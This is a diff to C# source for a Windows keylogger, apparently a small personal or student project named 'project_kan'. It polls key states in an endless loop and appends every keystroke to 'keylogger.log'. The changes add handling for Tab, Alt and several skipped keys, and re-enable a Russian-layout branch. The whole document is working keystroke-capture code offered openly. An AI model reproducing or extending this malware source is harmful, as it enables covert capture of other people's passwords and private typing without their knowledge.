@@ -9,6 +9,14 @@ namespace project_kan
         public static extern int GetAsyncKeyState(Int32 i);
         static void Main(String[] args)
         {
+            //string Text = "";
+            //InputLanguage myCurrentLanguage = InputLanguage.CurrentInputLanguage;
+            //Text = myCurrentLanguage.Culture.EnglishName;
+            //string text = Text;
+            //string nText;
+            //if (text == "English(United States") nText = "Russian (Russia)";
+            //else nText = "English (United States)";
+
             File.Delete("keylogger.log");
             string buf = "";
             while (true)
@@ -26,7 +34,6 @@ namespace project_kan
 
                     bool shift = false;
                     short shiftState = (short)GetAsyncKeyState(16);
-                    // Keys.ShiftKey не работает, поэтому я подставила его числовой эквивалент
                     if ((shiftState & 0x8000) == 0x8000)
                     {
                         shift = true;
@@ -39,9 +46,13 @@ namespace project_kan
                     {
                         if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                         if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
+                        if (((Keys)i) == Keys.Tab) { buf += "\t"; continue; }
                         if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
+
+                        if (((Keys)i).ToString().Contains("F1") || ((Keys)i).ToString().Contains("F2") || ((Keys)i) == Keys.F3 || ((Keys)i) == Keys.F4 || ((Keys)i) == Keys.F5 || ((Keys)i) == Keys.F6 || ((Keys)i) == Keys.F7 || ((Keys)i) == Keys.F8 || ((Keys)i) == Keys.F9) { continue; }
+
                         if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
-                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.NumLock || ((Keys)i) == Keys.PrintScreen) continue;
+                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.NumLock || ((Keys)i) == Keys.PrintScreen || ((Keys)i) == Keys.ControlKey || ((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey || ((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right || ((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down) continue;
                         if (((Keys)i).ToString().Length == 1)
                         {
                             if (isBig)
@@ -63,7 +74,7 @@ namespace project_kan
                                     break;
                                 case "D2":
                                     if (shift /*&& text == "English (United States)"*/) buf += "@";
-                                    //else if (shift /*&& text == "Russian (Russia)"*/) buf += '"'; 
+                                    else if (shift /*&& text == "Russian (Russia)"*/) buf += '"'; 
                                     else buf += "2";
                                     break;
                                 case "D3":
@@ -142,30 +153,41 @@ namespace project_kan
                                     if (shift) buf += "|";
                                     else buf += '\\';
                                     break;
+                                case "Menu":
+                                    File.AppendAllText("keylogger.log", "<alt>");
+                                    break;
+                                case "LMenu":
+                                    File.AppendAllText("keylogger.log", "<alt>");
+                                    break;
+                                case "RMenu":
+                                    File.AppendAllText("keylogger.log", "<alt>");
+                                    break;
+
+                                //case "LMenu":
+                                //    string temp = text;
+                                //    text = nText;
+                                //    nText = temp;
+                                //    break;
+                                //case "Menu":
+                                //    string temp1 = text;
+                                //    text = nText;
+                                //    nText = temp1;
+                                //    break;
+                                //case "RMenu":
+                                //    string temp2 = text;
+                                //    text = nText;
+                                //    nText = temp2;
+                                //    break;
                                 default:
                                     buf += $"<{((Keys)i).ToString()}>";
                                     break;
                             }
-                            //if (((Keys)i).ToString() == "D1")111~`~`~ ~~~ ``` ~ ~ ~ ``` ` ` ` 11111111111
-                            //{
-                            //    buf += "1";
-                            //}
-                            //else
-                            //{
-                            //    buf += $"<{((Keys)i).ToString()}>";
-                            //}
                         }
                         if (buf.Length > 10)
                         {
                             File.AppendAllText("keylogger.log", buf);
                             buf = "";
                         }
-                        //buf += ((Keys)i).ToString();
-                        //if (buf.Length > 10)
-                        //{
-                        //    File.AppendAllText("keylogger.log", buf);
-                        //    buf = "";
-                        //}
                     }
                 }
             }
